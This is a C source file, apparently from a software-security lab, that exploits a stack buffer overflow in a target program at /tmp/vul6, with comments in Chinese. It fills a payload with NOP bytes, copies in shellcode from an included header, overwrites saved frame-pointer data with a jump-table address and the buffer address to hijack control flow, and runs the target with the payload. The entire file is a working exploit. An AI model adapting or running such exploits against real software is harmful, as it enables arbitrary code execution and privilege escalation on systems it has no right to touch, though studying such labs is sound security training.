#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode/shellcode.h"

#define TARGET "/tmp/vul6"

int main(void)
{
    char payload[201];
    memset(payload, 0x90, 200);
    payload[200] = 0;
    //覆盖后的ebp
    unsigned int new_ebp = 0xffffdd00;
    //buf起始地址
    unsigned int buf = 0xffffdcb0;
    //覆盖后的ebp相对于buf起始地址的偏移
    unsigned int ebp_offset=new_ebp-buf;
    //需要修改的位置的地址（jmp指令的参数的保存地址）
    unsigned int jmp_addr = 0x804a00c;
    //将要修改的位置
    memcpy(payload +ebp_offset - 4, &jmp_addr, 4);
    //赋值为buf的起始地址，使得能够劫持程序到该位置
    memcpy(payload + ebp_offset - 8, &buf, 4);
    //将shellcode装载到buf的起始地址处
    memcpy(payload, shellcode, strlen(shellcode));

    char *args[] = {TARGET, payload, NULL};
    char *env[] = {NULL};

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}
